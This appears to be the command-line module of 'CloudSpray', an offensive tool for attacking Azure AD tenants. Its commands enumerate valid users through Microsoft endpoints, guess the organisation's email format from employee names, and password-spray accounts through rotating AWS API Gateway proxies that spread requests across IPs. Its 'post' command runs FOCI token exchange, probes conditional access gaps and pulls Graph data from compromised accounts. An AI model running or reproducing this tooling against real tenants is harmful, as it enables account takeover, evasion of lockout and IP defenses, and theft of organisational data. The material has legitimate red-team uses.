"""Click CLI commands: enum, spray, post, report, format."""

import random
import time

import click
import requests

from cloudspray.settings import CloudSprayConfig, load_config
from cloudspray.proxy import AWSGatewayProvider, ProxyManager
from cloudspray.proxy.session import FireproxSession
from cloudspray.reporting.console import ConsoleReporter
from cloudspray.state.db import StateDB
from cloudspray.utils import setup_logging


class MutuallyExclusive(click.Option):
    """Click option subclass that enforces mutual exclusivity with another option.

    Used for ``--passwords`` vs ``--password`` in the spray command -- the user
    must provide exactly one of them, not both.

    Usage::

        @click.option("-p", "--passwords", cls=MutuallyExclusive,
                      mutually_exclusive=["password"])

    Args:
        mutually_exclusive: List of option names that cannot be used alongside
            this option.
    """

    def __init__(self, *args, **kwargs):
        self.mutually_exclusive = set(kwargs.pop("mutually_exclusive", []))
        super().__init__(*args, **kwargs)

    def handle_parse_result(self, ctx, opts, args):
        """Check for conflicts and raise ``UsageError`` if both options are set."""
        current = self.name in opts and opts[self.name] is not None
        for other_name in self.mutually_exclusive:
            if other_name in opts and opts[other_name] is not None and current:
                raise click.UsageError(
                    f"--{self.name.replace('_', '-')} and "
                    f"--{other_name.replace('_', '-')} are mutually exclusive."
                )
        return super().handle_parse_result(ctx, opts, args)


@click.group()
@click.option(
    "--db",
    type=click.Path(),
    default="cloudspray.db",
    show_default=True,
    help="Path to SQLite state database.",
)
@click.option(
    "--quiet", "-q",
    is_flag=True,
    default=False,
    help="Suppress per-attempt output, show only progress bar and actionable results.",
)
@click.pass_context
def cli(ctx, db, quiet):
    """CloudSpray - Azure AD password sprayer and enumerator.

    AWS credentials are loaded from config.json. See config.json.example.
    """
    ctx.ensure_object(dict)

    cfg = load_config()
    ctx.obj["config"] = cfg
    ctx.obj["db_path"] = db

    log_level = "INFO" if quiet else "DEBUG"
    ctx.obj["logger"] = setup_logging(level=log_level)

    ctx.obj["reporter"] = ConsoleReporter(verbose=not quiet)


# Maps enumeration method names to the Microsoft host that handles them.
# OneDrive is None here because its host is derived from the target domain
# at runtime (e.g. "contoso-my.sharepoint.com").
_ENUM_TARGET_HOSTS = {
    "msol": "login.microsoftonline.com",
    "login": "login.microsoftonline.com",
    "onedrive": None,
    "teams": "teams.microsoft.com",
}

# All spray requests go through the main Microsoft login endpoint.
_SPRAY_TARGET_HOST = "login.microsoftonline.com"

# Common domain suffixes to try when bare tenant name doesn't resolve.
_DOMAIN_SUFFIXES = [".com", ".onmicrosoft.com", ".org", ".net"]


def _discover_tenant(domain: str, reporter: ConsoleReporter) -> str:
    """Validate a domain resolves to an Azure AD tenant before proceeding.

    Checks the OpenID Connect discovery endpoint to confirm the tenant exists.
    If the domain as-is doesn't work, tries appending common suffixes
    (e.g. "contoso" -> "contoso.com", "contoso.onmicrosoft.com").

    Returns the validated domain string, or raises SystemExit if no valid
    tenant is found.
    """
    oidc_url = "https://login.microsoftonline.com/{}/.well-known/openid-configuration"

    # Try the domain as provided first
    candidates = [domain]

    # If the domain has no dots, it's probably a bare tenant name — try suffixes
    if "." not in domain:
        candidates += [f"{domain}{suffix}" for suffix in _DOMAIN_SUFFIXES]

    for candidate in candidates:
        try:
            resp = requests.get(oidc_url.format(candidate), timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                tenant_id = data.get("issuer", "").split("/")[-2] if "issuer" in data else "unknown"
                reporter.info(f"Tenant found: {candidate} (ID: {tenant_id})")
                return candidate
        except requests.RequestException:
            continue

    # Nothing resolved — show what we tried
    reporter.error(f"No Azure AD tenant found for '{domain}'")
    reporter.error(f"Tried: {', '.join(candidates)}")
    reporter.error("Use a full domain (e.g. contoso.com) or tenant GUID.")
    raise SystemExit(1)


def _build_fireprox_session(
    config: CloudSprayConfig,
    target_host: str | None,
    reporter: ConsoleReporter,
) -> tuple[ProxyManager | None, FireproxSession | None]:
    """Create a FireproxSession backed by AWS API Gateway, if enabled.

    Fireprox creates temporary API Gateway endpoints in AWS that proxy
    HTTPS requests to the target host. Each gateway gets a unique AWS IP,
    providing IP rotation across spray attempts.

    The function handles the full lifecycle setup:
    1. Create an AWSGatewayProvider with the configured credentials/regions
    2. Deploy gateway endpoints targeting the specified host
    3. Wait for DNS propagation (5s)
    4. Run a health check to verify gateways are responding
    5. Return the session for use in spray/enum operations

    The caller is responsible for calling ``proxy_manager.teardown_all()``
    when done (typically in a ``finally`` block).

    Args:
        config: Full CloudSpray config with AWS gateway credentials.
        target_host: The Microsoft host to proxy to (e.g. "login.microsoftonline.com").
            If ``None``, proxy setup is skipped.
        reporter: Console reporter for status messages.

    Returns:
        Tuple of (ProxyManager, FireproxSession). Both are ``None`` when
        the proxy is disabled or target_host is ``None``.

    Raises:
        SystemExit: If the health check fails after gateway deployment.
    """
    if not config.proxy.aws_gateway.enabled or target_host is None:
        return None, None

    gw_cfg = config.proxy.aws_gateway
    provider = AWSGatewayProvider(
        access_key=gw_cfg.access_key,
        secret_key=gw_cfg.secret_key,
        regions=gw_cfg.regions,
    )

    manager = ProxyManager()
    manager.add_provider(provider)
    manager.setup_all(f"https://{target_host}")

    reporter.info("Waiting for gateways to propagate...")
    time.sleep(5)

    if not provider.health_check():
        reporter.error("Fireprox health check failed, tearing down gateways")
        manager.teardown_all()
        raise SystemExit(1)

    reporter.info(f"Fireprox ready: {len(provider._gateway_urls)} gateway(s) active")
    session = FireproxSession(provider, target_host)
    return manager, session


@cli.command("enum")
@click.option("-d", "--domain", required=True, help="Target domain.")
@click.option(
    "-u", "--users", required=True,
    type=click.Path(exists=True),
    help="Path to user list file.",
)
@click.option(
    "-m", "--method",
    type=click.Choice(["onedrive", "teams", "msol", "login"], case_sensitive=False),
    default="onedrive",
    show_default=True,
    help="Enumeration method.",
)
@click.option(
    "-o", "--output",
    type=click.Path(),
    default=None,
    help="Path to write valid usernames.",
)
@click.option("--teams-user", default=None, help="Teams auth username (for teams method).")
@click.option("--teams-pass", default=None, help="Teams auth password (for teams method).")
@click.pass_context
def enum_cmd(ctx, domain, users, method, output, teams_user, teams_pass):
    """Enumerate valid Azure AD users."""
    cfg = ctx.obj["config"]
    reporter = ctx.obj["reporter"]

    reporter.banner()

    # Validate tenant before doing anything expensive
    domain = _discover_tenant(domain, reporter)

    # Override config with CLI args
    cfg.target.domain = domain
    if teams_user:
        cfg.enum.teams_user = teams_user
    if teams_pass:
        cfg.enum.teams_pass = teams_pass

    # Validate teams creds when using teams method
    if method == "teams" and (not cfg.enum.teams_user or not cfg.enum.teams_pass):
        reporter.error("Teams method requires --teams-user and --teams-pass.")
        raise SystemExit(1)

    from cloudspray.enumerators import OneDriveEnumerator, TeamsEnumerator, MSOLEnumerator, LoginEnumerator
    from cloudspray.utils import read_userlist

    userlist = read_userlist(users)

    # Determine target host for proxy routing
    target_host = _ENUM_TARGET_HOSTS[method]
    if method == "onedrive":
        target_host = f"{domain.split('.')[0]}-my.sharepoint.com"

    proxy_manager, proxy_session = _build_fireprox_session(cfg, target_host, reporter)

    try:
        with StateDB(ctx.obj["db_path"]) as db:
            reporter.info(f"Enumeration starting: domain={domain}, method={method}")
            reporter.info(f"User list: {users} ({len(userlist)} entries)")

            if method == "onedrive":
                enumerator = OneDriveEnumerator(domain, db, reporter, proxy_session=proxy_session)
                valid = enumerator.enumerate(userlist)
            elif method == "teams":
                enumerator = TeamsEnumerator(
                    domain, db, reporter,
                    auth_user=cfg.enum.teams_user,
                    auth_pass=cfg.enum.teams_pass,
                )
                valid = enumerator.enumerate(userlist)
            elif method == "msol":
                enumerator = MSOLEnumerator(domain, db, reporter, proxy_session=proxy_session)
                valid = enumerator.enumerate(userlist)
            elif method == "login":
                enumerator = LoginEnumerator(domain, db, reporter, proxy_session=proxy_session)
                valid = enumerator.enumerate(userlist)
            else:
                reporter.error(f"Unknown enumeration method: {method}")
                return

            if output:
                with open(output, "w", encoding="utf-8") as f:
                    f.write("\n".join(valid) + "\n")
                reporter.info(f"Valid users written to {output}")

            reporter.info(f"Enumeration complete: {len(valid)} valid users found")
    except (KeyboardInterrupt, SystemExit):
        raise
    except Exception as exc:
        reporter.error(f"Enumeration failed: {exc}")
        raise SystemExit(1) from exc
    finally:
        if proxy_manager is not None:
            reporter.info("Tearing down Fireprox gateways")
            proxy_manager.teardown_all()


@cli.command("spray")
@click.option("-d", "--domain", required=True, help="Target domain.")
@click.option(
    "-u", "--users", required=True,
    type=click.Path(exists=True),
    help="Path to user list file.",
)
@click.option(
    "-p", "--passwords",
    type=click.Path(exists=True),
    default=None,
    cls=MutuallyExclusive,
    mutually_exclusive=["password"],
    help="Path to password list file.",
)
@click.option(
    "-P", "--password",
    default=None,
    cls=MutuallyExclusive,
    mutually_exclusive=["passwords"],
    help="Single password string.",
)
@click.option("--delay", type=click.IntRange(min=0), default=None, help="Seconds between attempts per user.")
@click.option("--jitter", type=click.IntRange(min=0), default=None, help="Random jitter range in seconds.")
@click.option("--lockout-threshold", type=click.IntRange(min=1), default=None, help="Hard stop after N consecutive lockouts.")
@click.option("--lockout-cooldown", type=click.IntRange(min=0), default=None, help="Per-user lockout cooldown in seconds (default 1800).")
@click.option(
    "--shuffle",
    type=click.Choice(["standard", "aggressive"], case_sensitive=False),
    default=None,
    help="Shuffle mode for spray ordering.",
)
@click.option("--resume", is_flag=True, default=False, help="Resume from database state.")
@click.pass_context
def spray_cmd(ctx, domain, users, passwords, password, delay, jitter,
              lockout_threshold, lockout_cooldown, shuffle, resume):
    """Run a password spray against Azure AD."""
    cfg = ctx.obj["config"]
    reporter = ctx.obj["reporter"]

    reporter.banner()

    if not passwords and not password:
        reporter.error("Provide either -p/--passwords (file) or -P/--password (single).")
        raise SystemExit(1)

    # Validate tenant before doing anything expensive
    domain = _discover_tenant(domain, reporter)

    # Override config with CLI args
    cfg.target.domain = domain
    if delay is not None:
        cfg.spray.delay = delay
    if jitter is not None:
        cfg.spray.jitter = jitter
    if lockout_threshold is not None:
        cfg.spray.lockout_threshold = lockout_threshold
    if lockout_cooldown is not None:
        cfg.spray.lockout_cooldown = lockout_cooldown
    if shuffle is not None:
        cfg.spray.shuffle_mode = shuffle

    from cloudspray.spray import Authenticator, SprayEngine
    from cloudspray.utils import read_userlist, read_password_list, normalize_email

    userlist = [normalize_email(u, domain) for u in read_userlist(users)]
    if passwords:
        passlist = read_password_list(passwords)
    else:
        passlist = [password]

    proxy_manager, proxy_session = _build_fireprox_session(cfg, _SPRAY_TARGET_HOST, reporter)

    try:
        with StateDB(ctx.obj["db_path"]) as db:
            reporter.info(f"Spray engine starting: domain={domain}")
            reporter.info(f"User list: {users} ({len(userlist)} entries)")
            reporter.info(
                f"Delay={cfg.spray.delay}s, Jitter={cfg.spray.jitter}s, "
                f"Shuffle={cfg.spray.shuffle_mode}"
            )
            authenticator = Authenticator(cfg.target.domain, proxy_session=proxy_session)
            engine = SprayEngine(cfg, db, authenticator, reporter)
            engine.run(userlist, passlist, resume=resume)
    except (KeyboardInterrupt, SystemExit):
        raise
    except Exception as exc:
        reporter.error(f"Spray failed: {exc}")
        raise SystemExit(1) from exc
    finally:
        if proxy_manager is not None:
            reporter.info("Tearing down Fireprox gateways")
            proxy_manager.teardown_all()


@cli.command("post")
@click.option("--foci", is_flag=True, default=False, help="Perform FOCI token exchange.")
@click.option("--ca-probe", is_flag=True, default=False, help="Probe conditional access policy gaps.")
@click.option("--exfil", is_flag=True, default=False, help="Lightweight data access check.")
@click.option("--user", default=None, help="Target specific user from valid credentials.")
@click.pass_context
def post_cmd(ctx, foci, ca_probe, exfil, user):
    """Post-exploitation actions on valid credentials."""
    reporter = ctx.obj["reporter"]

    reporter.banner()

    if not foci and not ca_probe and not exfil:
        reporter.error("Specify at least one action: --foci, --ca-probe, or --exfil.")
        raise SystemExit(1)

    from cloudspray.post import TokenManager, CAProbe, GraphExfil

    cfg = ctx.obj["config"]

    try:
        with StateDB(ctx.obj["db_path"]) as db:
            creds = db.get_valid_credentials()
            if not creds:
                reporter.error("No valid credentials in database. Run 'spray' first.")
                raise SystemExit(1)

            reporter.info(f"Post-exploitation: {len(creds)} valid credential(s) available.")
            if user:
                reporter.info(f"Targeting user: {user}")

            if foci:
                token_mgr = TokenManager(cfg.target.domain, db, reporter)
                results = token_mgr.exchange_all_valid_credentials()
                for username, tokens in results.items():
                    reporter.info(f"  {username}: {len(tokens)} tokens captured")

            if ca_probe:
                prober = CAProbe(cfg.target.domain, db, reporter)
                probe_results = prober.probe_all_blocked()
                prober.print_matrix(probe_results)

            if exfil:
                with GraphExfil(db, reporter) as exfiltrator:
                    if user:
                        exfiltrator.run_all(user)
                    else:
                        for cred in creds:
                            exfiltrator.run_all(cred.username)
    except (KeyboardInterrupt, SystemExit):
        raise
    except Exception as exc:
        reporter.error(f"Post-exploitation failed: {exc}")
        raise SystemExit(1) from exc


@cli.command("report")
@click.option(
    "-f", "--format",
    "output_format",
    type=click.Choice(["json", "csv"], case_sensitive=False),
    default="json",
    show_default=True,
    help="Report output format.",
)
@click.option(
    "-o", "--output", required=True,
    type=click.Path(),
    help="Output file path.",
)
@click.pass_context
def report_cmd(ctx, output_format, output):
    """Generate a report from the database."""
    reporter = ctx.obj["reporter"]

    reporter.banner()

    from cloudspray.reporting import JSONReporter, CSVReporter

    try:
        with StateDB(ctx.obj["db_path"]) as db:
            reporter.info(f"Generating {output_format.upper()} report: {output}")

            if output_format == "json":
                report_writer = JSONReporter(db)
            elif output_format == "csv":
                report_writer = CSVReporter(db)
            else:
                reporter.error(f"Unknown report format: {output_format}")
                return

            report_writer.generate(output)
            reporter.info(f"Report written to {output}")
    except (KeyboardInterrupt, SystemExit):
        raise
    except Exception as exc:
        reporter.error(f"Report generation failed: {exc}")
        raise SystemExit(1) from exc


# Common UPN format patterns. Each is a callable that takes (first, last)
# and returns the local part (before @domain).
_FORMAT_PATTERNS = {
    "first.last":  lambda f, l: f"{f}.{l}",
    "flast":       lambda f, l: f"{f[0]}{l}",
    "firstl":      lambda f, l: f"{f}{l[0]}",
    "firstlast":   lambda f, l: f"{f}{l}",
    "lastfirst":   lambda f, l: f"{l}{f}",
    "last.first":  lambda f, l: f"{l}.{f}",
    "lfirst":      lambda f, l: f"{l[0]}{f}",
    "first_last":  lambda f, l: f"{f}_{l}",
    "first-last":  lambda f, l: f"{f}-{l}",
    "first":       lambda f, l: f,
    "last":        lambda f, l: l,
}


@cli.command("format")
@click.option("-d", "--domain", required=True, help="Target domain.")
@click.option(
    "-n", "--names", required=True,
    type=click.Path(exists=True),
    help="File with full names (one per line, e.g. 'Thomas Cox').",
)
@click.pass_context
def format_cmd(ctx, domain, names):
    """Discover the UPN format used by an Azure AD tenant.

    Takes a list of known employee names and tests common email format
    patterns (first.last, flast, firstl, etc.) against the MSOL
    GetCredentialType endpoint to find which format the org uses.
    """
    reporter = ctx.obj["reporter"]
    cfg = ctx.obj["config"]

    reporter.banner()

    domain = _discover_tenant(domain, reporter)

    from cloudspray.utils import read_lines

    raw_names = read_lines(names)
    parsed_names = []
    for line in raw_names:
        parts = line.strip().split()
        if len(parts) < 2:
            reporter.debug(f"Skipping line (need first + last): {line}")
            continue
        parsed_names.append((parts[0].lower(), parts[-1].lower()))

    if not parsed_names:
        reporter.error("No valid names found. File should have 'First Last' per line.")
        raise SystemExit(1)

    reporter.info(f"Testing {len(parsed_names)} name(s) against {len(_FORMAT_PATTERNS)} format patterns")

    proxy_manager, proxy_session = _build_fireprox_session(
        cfg, "login.microsoftonline.com", reporter,
    )

    try:
        from cloudspray.enumerators import MSOLEnumerator

        with StateDB(ctx.obj["db_path"]) as db:
            enumerator = MSOLEnumerator(domain, db, reporter, proxy_session=proxy_session)

            # Track which formats found valid users
            format_hits: dict[str, list[str]] = {fmt: [] for fmt in _FORMAT_PATTERNS}

            for first, last in parsed_names:
                for fmt_name, fmt_fn in _FORMAT_PATTERNS.items():
                    local_part = fmt_fn(first, last)
                    email = f"{local_part}@{domain}"
                    result = enumerator._check_user(email)

                    if result is True:
                        format_hits[fmt_name].append(email)
                        reporter.info(f"[+] FOUND: {email}  (format: {fmt_name})")
                    elif result is False:
                        reporter.debug(f"[-] not found: {email}")
                    else:
                        reporter.debug(f"[?] ambiguous: {email}")

                    time.sleep(random.uniform(1.0, 3.0))

            # Summary
            reporter.info("")
            reporter.info("=== Format Discovery Results ===")
            winning_formats = {
                fmt: hits for fmt, hits in format_hits.items() if hits
            }

            if not winning_formats:
                reporter.error("No formats matched any names. Try different names or check the domain.")
            else:
                for fmt, hits in sorted(winning_formats.items(), key=lambda x: -len(x[1])):
                    reporter.info(f"  {fmt}: {len(hits)}/{len(parsed_names)} matched")
                    for email in hits:
                        reporter.info(f"    {email}")

                best_format = max(winning_formats, key=lambda f: len(winning_formats[f]))
                reporter.info(f"\nBest match: {best_format}")
                reporter.info(f"Use this to build your user list: <username>@{domain}")
                reporter.info(f"Pattern: {best_format} (e.g. {_FORMAT_PATTERNS[best_format]('john', 'smith')}@{domain})")

    except (KeyboardInterrupt, SystemExit):
        raise
    except Exception as exc:
        reporter.error(f"Format discovery failed: {exc}")
        raise SystemExit(1) from exc
    finally:
        if proxy_manager is not None:
            reporter.info("Tearing down Fireprox gateways")
            proxy_manager.teardown_all()
